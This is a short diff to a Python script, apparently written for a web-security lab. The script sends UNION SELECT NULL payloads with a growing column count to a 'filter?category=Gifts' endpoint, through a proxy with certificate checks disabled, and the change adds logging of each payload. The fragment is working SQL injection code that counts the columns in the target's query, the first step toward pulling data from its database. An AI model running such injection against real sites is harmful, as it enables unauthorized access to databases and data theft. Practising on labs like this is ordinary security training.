@@ -16,12 +16,12 @@ nombre_parametro = "Gifts"
 ruta = f"filter?category={nombre_parametro}"
 
 def Obtener_cantidad_columnas_función(url):
-    print("empezo el exploit")
     columna = 0
     bandera = True
     while bandera:
         columna += 1 
         payload_obtener_cantidad_columnas = "' UNION SELECT " + ", ".join(["NULL"] * columna) + "--"
+        print("Probando columna Nro: " + str(columna) + " -> Payload: " + str(payload_obtener_cantidad_columnas))
         solicitud = requests.get(url + ruta + payload_obtener_cantidad_columnas,verify=False, proxies=proxyjp) 
         respuesta = solicitud.text
         if "UNION SELECT" in respuesta: 
